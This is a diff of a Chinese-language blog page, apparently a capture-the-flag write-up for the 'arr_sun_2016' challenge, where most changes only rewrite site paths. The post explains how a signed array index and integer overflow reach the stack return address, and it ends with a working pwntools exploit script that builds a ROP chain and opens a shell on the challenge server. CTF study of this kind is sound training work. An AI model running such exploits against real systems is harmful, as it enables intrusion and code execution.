@@ -5,41 +5,41 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下，v2为有符号数，因此，这里存在下标越界的漏洞，但是是向上越界。   看似只能向上越界，实际，我们可以利用整数溢出，来达到劫持栈里的返回地址处。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="arr_sun_2016(从下标上溢跑到下标下溢)">
-<meta property="og:url" content="https://github.com/ha1vk/2020/06/11/arr_sun_2016/index.html">
+<meta property="og:url" content="https://github.com/2020/06/11/arr_sun_2016/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下，v2为有符号数，因此，这里存在下标越界的漏洞，但是是向上越界。   看似只能向上越界，实际，我们可以利用整数溢出，来达到劫持栈里的返回地址处。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/arr_sun_2016/image1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/arr_sun_2016/image2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/arr_sun_2016/image3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/arr_sun_2016/image4.png">
+<meta property="og:image" content="https://github.com/2020/06/11/arr_sun_2016/image1.png">
+<meta property="og:image" content="https://github.com/2020/06/11/arr_sun_2016/image2.png">
+<meta property="og:image" content="https://github.com/2020/06/11/arr_sun_2016/image3.png">
+<meta property="og:image" content="https://github.com/2020/06/11/arr_sun_2016/image4.png">
 <meta property="article:published_time" content="2020-06-11T09:40:50.000Z">
 <meta property="article:modified_time" content="2025-06-25T13:09:02.732Z">
 <meta property="article:author" content="ha1vk">
 <meta property="article:tag" content="ROP">
 <meta property="article:tag" content="整数溢出">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/06/11/arr_sun_2016/image1.png">
+<meta name="twitter:image" content="https://github.com/2020/06/11/arr_sun_2016/image1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/06/11/arr_sun_2016/">
+<link rel="canonical" href="https://github.com/2020/06/11/arr_sun_2016/">
 
 
 <script id="page-configurations">
@@ -101,7 +101,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -122,27 +122,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -200,10 +200,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/06/11/arr_sun_2016/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/06/11/arr_sun_2016/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -238,7 +238,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -261,19 +261,19 @@
 
       
         <p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/06/11/arr_sun_2016/image1.png" class="">
+<img src="/2020/06/11/arr_sun_2016/image1.png" class="">
 
 <p>然后，我们用IDA分析一下，v2为有符号数，因此，这里存在下标越界的漏洞，但是是向上越界。</p>
-<img src="/ha1vk/2020/06/11/arr_sun_2016/image2.png" class="">
+<img src="/2020/06/11/arr_sun_2016/image2.png" class="">
 
 <p>看似只能向上越界，实际，我们可以利用整数溢出，来达到劫持栈里的返回地址处。</p>
-<img src="/ha1vk/2020/06/11/arr_sun_2016/image3.png" class="">
+<img src="/2020/06/11/arr_sun_2016/image3.png" class="">
 
 <p>列出等式</p>
 <p>int(ebp+eax*4-0x30) &#x3D; int(ebp + 0x4)</p>
 <p>求解得到int(4*eax) &#x3D; 0x34</p>
 <p>满足条件的eax有多个，我们取eax&#x3D;0x8000000D</p>
-<img src="/ha1vk/2020/06/11/arr_sun_2016/image4.png" class="">
+<img src="/2020/06/11/arr_sun_2016/image4.png" class="">
 
 <p>这样，就可以劫持到返回地址处，做rop了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./arr_sun_2016&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28197</span>)</span><br><span class="line">scanf = <span class="number">0x08048460</span></span><br><span class="line">format_str = <span class="number">0x0804882F</span></span><br><span class="line">bss = <span class="number">0x08049B30</span></span><br><span class="line">backdoor = <span class="number">0x0804857B</span></span><br><span class="line">pop_2 = <span class="number">0x080487ba</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;What should I call you?&#x27;</span>,<span class="string">&#x27;haivk&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getIndex</span>(<span class="params">offset</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">str</span>(<span class="number">0x8000000d</span>-<span class="number">0x100000000</span> + offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeROP</span>(<span class="params">rop</span>):</span><br><span class="line">   i = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> item <span class="keyword">in</span> rop:</span><br><span class="line">      sh.sendlineafter(<span class="string">&#x27;enter index&#x27;</span>,getIndex(i))</span><br><span class="line">      sh.sendlineafter(<span class="string">&#x27;enter value&#x27;</span>,<span class="built_in">str</span>(item))</span><br><span class="line">      i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">rop = [scanf,pop_2,format_str,bss,backdoor,<span class="number">0</span>,bss,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">writeROP(rop)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -285,8 +285,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
-              <a href="/ha1vk/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" rel="tag"># 整数溢出</a>
+              <a href="/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" rel="tag"># 整数溢出</a>
           </div>
 
         
@@ -295,11 +295,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/06/11/d3ctf_2019_ezfile/" rel="prev" title="d3ctf_2019_ezfile(文件流fileno的巧妙利用)">
+    <a href="/2020/06/11/d3ctf_2019_ezfile/" rel="prev" title="d3ctf_2019_ezfile(文件流fileno的巧妙利用)">
       <i class="fa fa-chevron-left"></i> d3ctf_2019_ezfile(文件流fileno的巧妙利用)
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/06/11/ZJCTF_2019_Mesage/" rel="next" title="ZJCTF_2019_Mesage(地址值强制当成指令)">
+    <a href="/2020/06/11/ZJCTF_2019_Mesage/" rel="next" title="ZJCTF_2019_Mesage(地址值强制当成指令)">
       ZJCTF_2019_Mesage(地址值强制当成指令) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -371,20 +371,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -457,30 +457,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
